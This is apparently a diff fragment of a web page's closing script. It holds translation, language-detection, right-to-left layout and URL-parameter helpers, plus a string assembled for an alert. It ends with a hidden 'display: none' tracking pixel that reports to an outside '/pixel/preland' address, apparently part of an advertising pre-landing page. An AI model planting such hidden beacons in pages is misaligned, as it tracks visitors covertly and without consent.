+  } else {
+    console.log("element not Found: " + text);
+  }
+}
+
+function alert_string(lang, text) {
+  return translation[lang][text] + "\n\n";
+}
+
+function translation_available(lang) {
+  if (translation[lang]) {
+    return lang;
+  } else {
+    console.log("translation not Found: " + lang);
+    return "source";
+  }
+}
+
+function detect_language() {
+  var language = navigator.language || navigator.userLanguage;
+  if (language.length > 4) {
+    language = language[0] + language[1];
+  }
+  var rtlLanguages = ['ar', 'he', 'fa', 'ur'];
+  if (rtlLanguages.indexOf(language) !== -1) {
+    var i;
+    var wrappers = document.querySelectorAll('.wrapper');
+    for (i = 0; i < wrappers.length; i++) {
+      wrappers[i].setAttribute('dir', 'RTL');
+    }
+    var topWrappers = document.querySelectorAll('.top_wrapper');
+    for (i = 0; i < topWrappers.length; i++) {
+      topWrappers[i].style.textAlign = 'right';
+    }
+    var buttons = document.querySelectorAll('.button');
+    for (i = 0; i < buttons.length; i++) {
+      buttons[i].style.padding = '0 20px 18px 20px';
+    }
+  }
+  return translation_available(language);
+}
+
+function translate() {
+  var language = detect_language();
+  var y;
+  for (y in translation["source"]) {
+    if (Object.prototype.hasOwnProperty.call(translation["source"], y)) {
+      replace_text(language, y);
+      if (y == 'aler') {
+        strAlert += translation[language][y];
+      }
+    }
+  }
+}
+
+function getURLParameter(name) {
+  return decodeURI(
+    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+  );
+}
+  </script>
+
+
+
+
+
+<img src="https://locusflourishgarlic.com/pixel/preland?c=11840&amp;e=1&amp;u=49" style="display: none;"></body></html>
